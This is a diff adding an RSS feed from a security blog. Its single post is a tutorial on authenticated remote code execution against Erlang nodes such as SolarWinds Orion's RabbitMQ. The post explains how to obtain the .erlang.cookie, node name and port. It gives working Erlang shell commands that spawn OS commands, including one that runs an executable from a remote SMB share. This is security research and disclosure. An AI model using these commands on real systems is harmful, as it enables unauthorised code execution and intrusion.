@@ -1,0 +1,135 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Rce on </title>
+    <link>https://malicious.link/tags/rce/</link>
+    <description>Recent content in Rce on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 15 Sep 2018 09:30:44 -0500</lastBuildDate>
+    
+        <atom:link href="https://malicious.link/tags/rce/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Erlang Authenticated Remote Code Execution</title>
+      <link>https://malicious.link/post/2018/erlang-arce/</link>
+      <pubDate>Sat, 15 Sep 2018 09:30:44 -0500</pubDate>
+      
+      <guid>https://malicious.link/post/2018/erlang-arce/</guid>
+      <description>
+
+&lt;p&gt;&lt;a href=&#34;http://erlang.org/faq/introduction.html&#34;&gt;Erlang is a programming language&lt;/a&gt; that I have tried to learn a few times in the past but never really dug in, that is, until recently.&lt;/p&gt;
+
+&lt;p&gt;Erlange is an interesting language because it has &lt;a href=&#34;http://erlang.org/faq/introduction.html&#34;&gt;&amp;ldquo;built-in concurrency, distribution, and fault tolerence&amp;rdquo;&lt;/a&gt;. To me, this means that it does job queing and distributed tasks right out of the gate.&lt;/p&gt;
+
+&lt;h3 id=&#34;a-little-bit-of-history&#34;&gt;A little bit of history&lt;/h3&gt;
+
+&lt;p&gt;I first started digging into Erlang again from an attackers point of view at &lt;a href=&#34;https://www.bsidesphilly.org/&#34;&gt;BSides Philadelphia&lt;/a&gt; 2016, where I talked about SolarWinds ORION. I was in the audience making last minute changes to my slides when I happened upon an &amp;ldquo;erlang-node&amp;rdquo; port (25672) listening. You can watch the video here (I&amp;rsquo;ve jumped ahead to the part about the erlang port):&lt;/p&gt;
+
+&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/VXUPyod6vqw?start=240&#34; frameborder=&#34;0&#34; allow=&#34;autoplay; encrypted-media&#34; allowfullscreen&gt;&lt;/iframe&gt;
+
+&lt;p&gt;After I gave that talk I asked around &lt;a href=&#34;http://novahackers.blogspot.com/p/how-to-join-and-rules.html&#34;&gt;NoVA Hackers&lt;/a&gt;. Luckily one such individual did, and that&amp;rsquo;s why I love what NoVA Hackers has grown into, but this post isn&amp;rsquo;t about that.&lt;/p&gt;
+
+&lt;p&gt;With a little bit of back and forth with what I was trying to accomplish, we worked out the the needed requirements for code exection.&lt;/p&gt;
+
+&lt;h3 id=&#34;erlnag-nodes&#34;&gt;Erlnag Nodes&lt;/h3&gt;
+
+&lt;p&gt;Erlang uses &amp;ldquo;Nodes&amp;rdquo; to execution code. As far as I can tell (and I&amp;rsquo;ll probably be corrected) but you must run a node to execute any type of erlang code, so everything written in Erlang (RabbitMQ, CouchDB, etc) must be running a node. Erlang nodes are identified by their hostname. For my SolarWinds box, it&amp;rsquo;s &lt;code&gt;WIN-PM0ID6F0AHN&lt;/code&gt;. This is the easiest piece of information to acquire for the authenticated RCE.&lt;/p&gt;
+
+&lt;h3 id=&#34;the-cookie&#34;&gt;The Cookie&lt;/h3&gt;
+
+&lt;p&gt;The Erlang cookie &lt;strong&gt;SHOULD&lt;/strong&gt; be the hardest to acquire. It&amp;rsquo;s essentially the shared secret password between nodes, and just a simple string. This cookie exists even if only a single node is spun up (such is the case for SolarWinds). It is most commonly stored in a file called &lt;code&gt;.erlang.cookie&lt;/code&gt; with nothing in the file other than the string. You can find it in home directories, userprofiles, project files and such. On Linux, it begining with the &lt;code&gt;.&lt;/code&gt; means that it&amp;rsquo;s automatically a &amp;ldquo;hidden&amp;rdquo; file, but on Windows it doesn&amp;rsquo;t mean much ;). RabbitMQ documents well where the key is located:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.rabbitmq.com/clustering.html#erlang-cookie&#34;&gt;https://www.rabbitmq.com/clustering.html#erlang-cookie&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Example &lt;code&gt;.erlang.cookie&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;rabbit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;One Windows for Solar Winds it can be found in &lt;strong&gt;Program Data&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_cookie.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;the-cluster-name&#34;&gt;The Cluster Name&lt;/h3&gt;
+
+&lt;p&gt;The cluster name is needed to join the cluster but this is more of a guessing game. However, luckily these are regularly named based on the service being offered. RabbitMQ in particular almost always has a cluster name of &lt;code&gt;rabbit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;the-node-port&#34;&gt;The Node Port&lt;/h3&gt;
+
+&lt;p&gt;This is actually pretty interesting that I haven&amp;rsquo;t dived into completely yet, but the port isn&amp;rsquo;t specified or default. There is some sort of discovery process so no matter the port the nodes are running on Erlang is able t find it. In the case of SolarWinds Orion&amp;rsquo;s RabbitMQ, its &lt;code&gt;25672&lt;/code&gt; but I&amp;rsquo;ve seen erlang nodes on a number of other ports, usually particular to the project it&amp;rsquo;s being run for.&lt;/p&gt;
+
+&lt;h3 id=&#34;remote-code-execution&#34;&gt;Remote Code Execution&lt;/h3&gt;
+
+&lt;p&gt;A simple &lt;code&gt;apt install erlang&lt;/code&gt; gets you ready for exectuion. Once installed you need to put your &lt;code&gt;.erlang.cookie&lt;/code&gt; file in your home directory &lt;code&gt;~/&lt;/code&gt;. You also need to resolve the hostname (Node name) you wil be connecting to.&lt;/p&gt;
+
+&lt;p&gt;Then it&amp;rsquo;s just running a couple commands:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;test&lt;/code&gt; is the node name you&amp;rsquo;ll be calling your attack box when connecting to the cluster&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;rabbit&lt;/code&gt; is the cluster name being connected to&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;WIN-PM0ID6F0AHN&lt;/code&gt; is the hostname I&amp;rsquo;m connecting to the cluster via&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Start up Erlang with &lt;code&gt;erl -sname test&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# erl -sname test
+Erlang/OTP 18 [erts-7.3.1.2] [source] [64-bit] [async-threads:10] [kernel-poll:false]
+
+Eshell V7.3.1.2  (abort with ^G)
+(test@kali)1&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Connecting to the cluster (the period on the end of the commands important terminators)&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(test@kali)1&amp;gt; net_kernel:connect(&#39;rabbit@WIN-PM0ID6F0AHN&#39;).
+true
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you get a &lt;code&gt;true&lt;/code&gt; that means the connection was successful.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Code exeuction (starting calc of course)&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(test@kali)2&amp;gt; erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;calc.exe&amp;quot;]).
+&amp;lt;6867.30570.461&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And so, like any good code execution attack, &lt;code&gt;calc.exe&lt;/code&gt; is executed:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_calc.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On Windows of course you can even do SMB shares:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;\\\\192.168.80.69\\share\\runme.exe&amp;quot;]).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Exiting the &lt;strong&gt;Erlang Shell&lt;/strong&gt; is done with the init::stop function:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(test@kali)3&amp;gt; init:stop().
+ok
+(test@kali)4&amp;gt; root@kali:~#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;warning-by-running-this-code-execution-method-you-are-running-a-node-as-well-as-as-long-as-you-have-the-connection-open-you-can-be-exploited-the-same-way-you-are-exploiting-the-remote-host&#34;&gt;Warning: By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host.&lt;/h4&gt;
+
+&lt;h3 id=&#34;the-bad-and-the-worse&#34;&gt;The Bad, and the worse&amp;hellip;&lt;/h3&gt;
+
+&lt;p&gt;In many Docker instances the &lt;code&gt;.erlang.cookie&lt;/code&gt; file is statically assigned and easy to find in the code. This is incredibly dangerous to have a statically assigned Erlang cookie for anyone who uses your Docker image, however because Docker doesn&amp;rsquo;t automatically expose ports from the docker instance, this is actually a better scenario in many cases than running the erlang project without containers.&lt;/p&gt;
+
+&lt;p&gt;This is not always the case and just like &lt;a href=&#34;https://www.itnews.com.au/news/passwords-ssh-keys-exposed-on-github-330152&#34;&gt;private keys on github&lt;/a&gt;, really easy to find:&lt;/p&gt;
+
+&lt;p&gt;Searching for &lt;code&gt;.erlang.cookie&lt;/code&gt; on Github:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_github.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;the-ugly&#34;&gt;The Ugly&lt;/h3&gt;
+
+&lt;p&gt;Changing the Erlang Cookie is a pain, and usually very deep in the project or setup, so once you have the file, you have future proof code execution.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
